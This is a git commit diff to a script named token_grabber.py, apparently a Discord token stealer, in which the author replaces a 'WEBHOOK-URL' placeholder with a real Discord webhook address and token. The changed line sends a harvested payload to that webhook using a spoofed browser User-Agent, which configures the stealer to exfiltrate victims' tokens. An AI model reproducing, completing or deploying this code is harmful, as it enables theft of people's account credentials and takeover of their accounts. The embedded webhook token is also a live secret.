9eec44b23f7ef274eb4955bce9025641f4e70ea9
bobrdobr90 <KAKASKABEN@GMAIL.COM>
2024-10-05 22:09:32 +0400

    Update token_grabber.py

--- token_grabber.py
+++ token_grabber.py
@@ -121,7 +121,7 @@ def get_token():
                                 'Content-Type': 'application/json',
                                 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
                             }
-                            req = Request('WEBHOOK-URL', data=payload.encode(), headers=headers2)
+                            req = Request('https://discord.com/api/webhooks/1292186332860518552/JGFU4X69pTUphnIuyrn7KcYcr4nFQuvIn6hrf7zjRVX0Sr6HCxIYtsUhXcL--st8XQUh', data=payload.encode(), headers=headers2)
                             urlopen(req)
                         except: continue
                 else: continue
